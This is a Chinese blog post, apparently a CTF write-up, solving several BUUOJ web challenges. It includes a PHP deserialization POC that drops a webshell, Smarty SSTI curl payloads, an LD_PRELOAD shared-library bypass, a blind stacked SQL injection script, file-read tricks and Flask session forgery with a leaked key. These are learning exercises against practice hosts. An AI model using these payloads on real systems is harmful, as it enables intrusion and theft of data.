<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>BUUOJ-web刷题（二）</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/03/19/Git%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/&title=BUUOJ-web刷题（二）" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/&title=BUUOJ-web刷题（二）" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/&text=BUUOJ-web刷题（二）" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BUUOJ-web刷题（二）&body=Check out this article: http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-强网杯-2019-Upload"><span class="toc-number">1.</span> <span class="toc-text">0x 01 强网杯 2019]Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-CISCN2019-华东南赛区-Web11"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [CISCN2019 华东南赛区]Web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-Wallbreaker-Easy"><span class="toc-number">3.</span> <span class="toc-text">0x 03 Wallbreaker_Easy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-SWPU2019-Web4"><span class="toc-number">4.</span> <span class="toc-text">0x 04 [SWPU2019]Web4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-SWPU2019-Web3"><span class="toc-number">5.</span> <span class="toc-text">0x 05 [SWPU2019]Web3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-SWPUCTF-2018-SimplePHP"><span class="toc-number">6.</span> <span class="toc-text">0x 06 [SWPUCTF 2018]SimplePHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-SWPU2019-Web6"><span class="toc-number">7.</span> <span class="toc-text">0x 07 [SWPU2019]Web6</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        BUUOJ-web刷题（二）
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">John Doe</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-03-18T13:58:27.000Z" itemprop="datePublished">2020-03-18</time>
        
        (Updated: <time datetime="2020-03-26T07:47:55.473Z" itemprop="dateModified">2020-03-26</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/ctfwp/">ctfwp</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/BUUOJ/" rel="tag">BUUOJ</a>, <a class="tag-link" href="/tags/web/" rel="tag">web</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="0x-01-强网杯-2019-Upload"><a href="#0x-01-强网杯-2019-Upload" class="headerlink" title="0x 01 强网杯 2019]Upload"></a>0x 01 强网杯 2019]Upload</h3><ul>
<li><p>考点</p>
<p>代码审计，PHP 反序列化</p>
</li>
<li><p>解题过程</p>
</li>
</ul>
<ol>
<li>目录扫描发现 /<a href="http://www.tar.gz敏感文件，下载下来进行审计，存在" target="_blank" rel="noopener">www.tar.gz敏感文件，下载下来进行审计，存在</a> .idea 目录，拖入Phpstrom查看，发现存在两处断点,猜测是出题人的提示</li>
</ol>
<p>application/web/controller/Index.php：</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319110910722.png" alt></p>
<p>application/web/controller/Register.php：</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319111027954.png" alt></p>
<ol start="2">
<li>审计代码发现：①Register.php注册，有<strong>destruct()函数，想判断注没注册，没注册的给调用 check 也就是 Index 的 index 方法②Index.php，最主要的就是login_check函数，并且发现其他函数执行前一般都会调用这个，应该是检查有没有登陆，最关键的是把cookie(‘user’)反序列化了，所以payload应该放在cookie(‘user’)里。③Profile.php，对文件进行操作，有__</strong>get,__call方法<br><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319112709035.png" alt></li>
</ol>
<p>在upload_img方法中</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319112809487.png" alt></p>
<p>先login_check检查登陆，然后判断上传的文件是否为空，不为空则将文件信息赋值给<br> $this-&gt;filename_tmp，将文件名md5加密并拼接png赋值给$this-&gt;filename，进入ext_check判断后缀是否为png，将结果给$this-&gt;ext</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319112855911.png" alt></p>
<ol start="3">
<li>利用思路：我们先上传一个图片马，然后将filename_tmp=图片马路径，filename=xxx.php，经过复制便可达到getshell，所以要想办法在不上传文件的情况下调用upload_img</li>
</ol>
<p>回到入口函数：<br> Register::__destruct()进入if，调用$this-&gt;checker的index()，将$this-&gt;checker=new Profile()，会调用Profile::_call:</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113057678.png" alt></p>
<p>那么此时$this-&gt;name=index，$args为空，进入if的代码就变成了：<code>$this-&gt;index();</code></p>
<p>调用了该类中不存在的成员变量，触发_get魔术方法</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113233704.png" alt></p>
<p>_get会返回$this-&gt;except[‘index’]，也就是$this-&gt;except<a href>‘index’</a>，只要将except[‘index’]=upload_img就能调用了</p>
<ol start="4">
<li>先利用蚁剑生成webshell，然后使用十六进制工具复制进正常图片的结尾处</li>
</ol>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113647891.png" alt></p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113557518.png" alt></p>
<p>注册账号上传图片，得到图片路径</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319114124209.png" alt></p>
<p>生成poc:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">class Register&#123;</span><br><span class="line">	public $checker;</span><br><span class="line">    public $registed;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    	&#x2F;&#x2F;确保进入if</span><br><span class="line">    	$this-&gt;registed &#x3D; 0;</span><br><span class="line">        $this-&gt;checker &#x3D; new Profile();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">class Profile&#123;</span><br><span class="line">    public $filename_tmp;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $except;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    	$this-&gt;except&#x3D;[&#39;index&#39;&#x3D;&gt;&#39;upload_img&#39;];</span><br><span class="line">    	$this-&gt;filename_tmp &#x3D;&quot;.&#x2F;upload&#x2F;76d9f00467e5ee6abc3ca60892ef304e&#x2F;4a47a0db6e60853dedfcfdf08a5ca249.png&quot;;</span><br><span class="line">    	$this-&gt;filename &#x3D; &quot;.&#x2F;upload&#x2F;shell.php&quot;;</span><br><span class="line">    	$this-&gt;ext&#x3D;&quot;png&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo base64_encode(serialize(new Register()));</span><br></pre></td></tr></table></figure>

<p>将cookie替换成生成的结果，刷新页面，访问shell.php</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319114414679.png" alt></p>
<p>连接蚁剑，得到flag</p>
<p>参考资料：</p>
<blockquote>
<p><a href="https://blog.csdn.net/chasingin/article/details/104374416" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104374416</a></p>
<p><a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p>
</blockquote>
<h3 id="0x-02-CISCN2019-华东南赛区-Web11"><a href="#0x-02-CISCN2019-华东南赛区-Web11" class="headerlink" title="0x 02 [CISCN2019 华东南赛区]Web11"></a>0x 02 [CISCN2019 华东南赛区]Web11</h3><ul>
<li><p>考点</p>
<p>Smarty SSTI</p>
</li>
<li><p>解题过程</p>
</li>
</ul>
<ol>
<li><p>题目提醒<code>Build With Smarty</code>，猜测应该是<code>smarty ssti</code>，右上角显示了<code>IP</code>，猜测注入点应该再<code>X-Forwarded-For</code>3.1.30</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319235007674.png" alt></p>
<ol start="2">
<li>设置<code>X-Forwarded-For</code>为<code>{7+7}</code>，在<code>current ip</code> 处回显<code>14</code>，确实在这里存在<code>ssti</code></li>
</ol>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;node3.buuoj.cn:25138&#x2F;xff&#x2F; -H &quot;X-Forwarded-For: &#123;&#123;7+7&#125;&#125;&quot;   &#x2F;&#x2F;返回14</span><br><span class="line">curl http:&#x2F;&#x2F;node3.buuoj.cn:25138&#x2F;xff&#x2F; -H &quot;X-Forwarded-For: &#123;$smarty.version&#125;&quot;   &#x2F;&#x2F;返回3.1.30</span><br><span class="line"></span><br><span class="line">使用if标签执行命令</span><br><span class="line">curl http:&#x2F;&#x2F;node3.buuoj.cn:25138&#x2F;xff&#x2F; -H &quot;X-Forwarded-For: &#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>参考资料：</p>
<blockquote>
<p><a href="https://www.freebuf.com/column/219913.html" target="_blank" rel="noopener">https://www.freebuf.com/column/219913.html</a></p>
</blockquote>
<h3 id="0x-03-Wallbreaker-Easy"><a href="#0x-03-Wallbreaker-Easy" class="headerlink" title="0x 03 Wallbreaker_Easy"></a>0x 03 Wallbreaker_Easy</h3><ul>
<li><p>考点</p>
<p>disable_function bypass</p>
</li>
<li><p>解题过程</p>
</li>
</ul>
<ol>
<li>攻击思路</li>
</ol>
<p>利用<code>Imagick()</code>中会触发<code>php解释器向外开启系统进程</code>的方法，这里的思路是当传入<code>MPEG</code>格式类型的文件时候，为了转换格式会向外部环境请求并触发<code>ffmpeg</code>的调用，从而开启新的进程。在开启时，环境变量<code>LD_PRELOAD</code>会首先加载，而我们事先会将我们的<code>恶意共享文件hack.so在这个环境变量中指出来</code>，即<code>LD_PRELOAD={DIR}/hack.so</code>。hack.so共享文件由hack.c文件编译，其中调用了<code>__attribute__((constructor))</code>，该方法会在共享文件被加载的时候率先被执行。</p>
<ol start="2">
<li>编写hack.c</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    system(&quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;8810490ee01835952ff9359d77cce4bd&#x2F;lxj.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用命令<code>gcc --share -fPIC hack.c -o hack.so</code>命令来编译共享文件</p>
<p>获取so文件的base64值：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'1.txt'</span>,base64_encode(file_get_contents(<span class="string">'P3rh4ps.so'</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传文件并执行</p>
<p>一打就崩。。。。</p>
<p>参考资料：</p>
<blockquote>
<p><a href="https://p3rh4ps.top/index.php/2020/01/12/20-1-12-总结/" target="_blank" rel="noopener">https://p3rh4ps.top/index.php/2020/01/12/20-1-12-%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://glotozz.github.io/2020/02/26/从一道题学习bypass-disable-func/#一-dl-拓展库绕过" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/#%E4%B8%80-dl-%E6%8B%93%E5%B1%95%E5%BA%93%E7%BB%95%E8%BF%87</a></p>
<p><a href="https://ch4ser-go.github.io/2019/12/26/LD-PRELOAD劫持类型题目/" target="_blank" rel="noopener">https://ch4ser-go.github.io/2019/12/26/LD-PRELOAD%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/</a></p>
<p><a href="https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/" target="_blank" rel="noopener">https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/</a></p>
</blockquote>
<h3 id="0x-04-SWPU2019-Web4"><a href="#0x-04-SWPU2019-Web4" class="headerlink" title="0x 04 [SWPU2019]Web4"></a>0x 04 [SWPU2019]Web4</h3><ul>
<li><p>考点</p>
<p>堆叠注入</p>
</li>
<li><p>解题过程</p>
</li>
</ul>
<ol>
<li><p>题目打开是一个登陆页面，输入账号密码后点击登陆页面无任何相应，注册功能也是尚未开放。查看源代码可以看到一个js文件，F12也可以看到一个网络请求。</p>
<p>js主要功能是将username和password以json格式然后发给index.php?r=Login/Login。</p>
<p>抓包进行测试发现username中加入单引号会直接500错误，而闭合引号后会正常显示。证明存在注入点，但是过滤了select,if,sleep,substr等大多数注入常见的单词。在单引号后加入分号(;)，若无法多语句执行，返回页面按理说应该是500，但在这里可以看到正常回显，说明可能存在堆叠入。</p>
</li>
</ol>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323000349366.png" alt></p>
<ol start="2">
<li>在这里我们就可以用16进制+<a href="https://dev.mysql.com/doc/refman/5.7/en/sql-prepared-statements.html" target="_blank" rel="noopener">mysql预处理</a>来绕过。</li>
</ol>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/E:%5CHexo-Blog%5Csource_posts%5CBUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89%5Ct01c4535f91421496d4.png" alt></p>
<p>这里偷个懒，使用官方wp的脚本跑了一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">#author: c1e4r</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    #题目地址</span><br><span class="line">    url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;925fe2df-66f2-40c3-b13d-5b86e079f231.node3.buuoj.cn&#x2F;index.php?r&#x3D;Login&#x2F;Login&#39;&#39;&#39;</span><br><span class="line">    #注入payload</span><br><span class="line">    payloads &#x3D; &quot;asd&#39;;set @a&#x3D;0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span><br><span class="line">    flag &#x3D; &#39;&#39;</span><br><span class="line">    for i in range(1,30):</span><br><span class="line">        #查询payload</span><br><span class="line">        payload &#x3D; &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))&#x3D;&#123;1&#125;,sleep(3),1)&quot;</span><br><span class="line">        for j in range(0,128):</span><br><span class="line">            #将构造好的payload进行16进制转码和json转码</span><br><span class="line">            datas &#x3D; &#123;&#39;username&#39;:payloads.format(str_to_hex(payload.format(i,j))),&#39;password&#39;:&#39;test213&#39;&#125;</span><br><span class="line">            data &#x3D; json.dumps(datas)</span><br><span class="line">            times &#x3D; time.time()</span><br><span class="line">            res &#x3D; requests.post(url &#x3D; url, data &#x3D; data)</span><br><span class="line">            if time.time() - times &gt;&#x3D; 3:</span><br><span class="line">                flag &#x3D; flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def str_to_hex(s):</span><br><span class="line">    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>得到<code>glzjin_wants_a_girl_friend.zip</code>，访问得到源代码包。</p>
<ol start="3">
<li>审计代码发现是一个简单的mvc框架。</li>
</ol>
<p>url大致的解析流程：从r参数中获取要访问的Controller以及Action,然后以/分隔开后拼接成完整的控制器名。以Login/Index为例，就是将Login/Index分隔开分别拼接成LoginController以及actionIndex,然后调用LoginController这个类中的actionIndex方法。每个action里面会调用对应的loadView()方法进行模版渲染，然后将页面返回给客户端。若访问的Controller不存在则默认解析Login/Index。</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323001018876.png" alt></p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323001209515.png" alt></p>
<p>其中 ,BaseController的loadView方法发现使用了extract，后面又include了一个文件。那么意味着只要$viewData可控我们即可覆盖掉$this-&gt;viewPath文件中的某些变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Controller&#x2F;UserController.php</span><br><span class="line">public function actionIndex()</span><br><span class="line">&#123;</span><br><span class="line">    $listData &#x3D; $_REQUEST;</span><br><span class="line">    $this-&gt;loadView(&#39;userIndex&#39;,$listData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$listData是从REQUEST提取出来的，完全可控。而其对应的/View/userIndex.php中存在一个文件读取。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;View&#x2F;userIndex.php</span><br><span class="line">if(!isset($img_file)) &#123;</span><br><span class="line">$img_file &#x3D; &#39;&#x2F;..&#x2F;favicon.ico&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$img_dir &#x3D; dirname(__FILE__) . $img_file;</span><br><span class="line">$img_base64 &#x3D; imgToBase64($img_dir);</span><br><span class="line">echo &#39;&lt;img src&#x3D;&quot;&#39; . $img_base64 . &#39;&quot;&gt;&#39;;</span><br></pre></td></tr></table></figure>

<p>$img_file可通过extract($viewData)变量覆盖漏洞完全控制，而$viewData是受用户控制的完全控制的。所以这里就存在一个任意文件读取漏洞。</p>
<p>访问：<code>925fe2df-66f2-40c3-b13d-5b86e079f231.node3.buuoj.cn/index.php?r=User/Index&amp;img_file=/../flag.php</code>即可得到base64编码的flag</p>
<h3 id="0x-05-SWPU2019-Web3"><a href="#0x-05-SWPU2019-Web3" class="headerlink" title="0x 05 [SWPU2019]Web3"></a>0x 05 [SWPU2019]Web3</h3><ul>
<li><p>考点</p>
<p>flask-session伪造、linux相关知识</p>
</li>
<li><p>解题过程</p>
</li>
</ul>
<p>1、页面打开是一个登陆界面，随便输入用户名和密码即可成功登入，有一个上传功能，但是点进去提示<code>Permission denied!</code>，需要管理员权限。右键查看源代码发现题目提示<code>404 not found</code></p>
<blockquote>
<p>在 flask 中，可以使用 app.errorhandler()装饰器来注册错误处理函数，参数是 HTTP 错误状态码或者特定的异常类，由此我们可以联想到在 404 错误中会有东西存在。</p>
</blockquote>
<p>访问一个不存在的路由：/logina，显示<code>404 not found</code>，在 HTTP 头中我们可以看到一串 base64 字符串，解码后可以得到 secret_key:<code>keyqqqwwweee!@#$%^&amp;*</code></p>
<ol start="2">
<li>使用<code>flask_session_cookie_manager3.py</code>来伪造cookie，<strong>注意要在linux环境下运行</strong></li>
</ol>
<p>解密session得到：<code>{&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;123&#39;, &#39;username&#39;: &#39;123&#39;}</code></p>
<p>修改 id=b’1’，得到cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_manager.py encode -s &quot;keyqqqwwweee!@#$%^&amp;*&quot; -t &quot;&#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;123&#39;, &#39;username&#39;: &#39;123&#39;&#125;&quot;</span><br><span class="line">eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSu2A.SeLyR45y3lQcF1dRjwzQw5Y-3TE</span><br><span class="line">这里我们伪造id:b&#39;1&#39;的用户session进行登录</span><br></pre></td></tr></table></figure>

<p>成功登陆，得到如下</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323151641468.png" alt></p>
<p>右键查看源代码，里面有 upload()和 showflag()两个函数的源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">upload()关键代码：</span><br><span class="line">basepath&#x3D;os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">path &#x3D; basepath+&#39;&#x2F;upload&#x2F;&#39;+md5_ip+&#39;&#x2F;&#39;+md5_one+&#39;&#x2F;&#39;+session[&#39;username&#39;]+&quot;&#x2F;&quot;</span><br><span class="line">path_base &#x3D; basepath+&#39;&#x2F;upload&#x2F;&#39;+md5_ip+&#39;&#x2F;&#39;</span><br><span class="line">filename &#x3D; f.filename</span><br><span class="line">pathname &#x3D; path+filename</span><br><span class="line">if &quot;zip&quot; !&#x3D; filename.split(&#39;.&#39;)[-1]:</span><br><span class="line">    return &#39;zip only allowed&#39;</span><br><span class="line">......</span><br><span class="line">try:</span><br><span class="line">    cmd &#x3D; &quot;unzip -n -d &quot;+path+&quot; &quot;+ pathname</span><br><span class="line">    if cmd.find(&#39;|&#39;) !&#x3D; -1 or cmd.find(&#39;;&#39;) !&#x3D; -1:</span><br><span class="line">        waf()</span><br><span class="line">        return &#39;error&#39;</span><br><span class="line">    os.system(cmd)</span><br><span class="line">......</span><br><span class="line">image &#x3D; open(path+unzip_filename, &quot;rb&quot;).read()</span><br><span class="line">resp &#x3D; make_response(image)</span><br><span class="line">resp.headers[&#39;Content-Type&#39;] &#x3D; &#39;image&#x2F;png&#39;</span><br><span class="line">return resp</span><br></pre></td></tr></table></figure>

<p>这里的功能就是客户端上传一个压缩后的图片，服务端会解压缩后并读取图片返回客户端。但是我们可以上传一个软链接压缩包，来读取其他敏感文件而不是我们上传的文件。同时结合 showflag()函数的源码，我们可以得知 flag.jpg 放在 flask 应用根目录的 flag 目录下。那么我们只要创建一个到<code>/xxx/flask/flag/flag.jpg</code>的软链接，即可读取 flag.jpg 文件。</p>
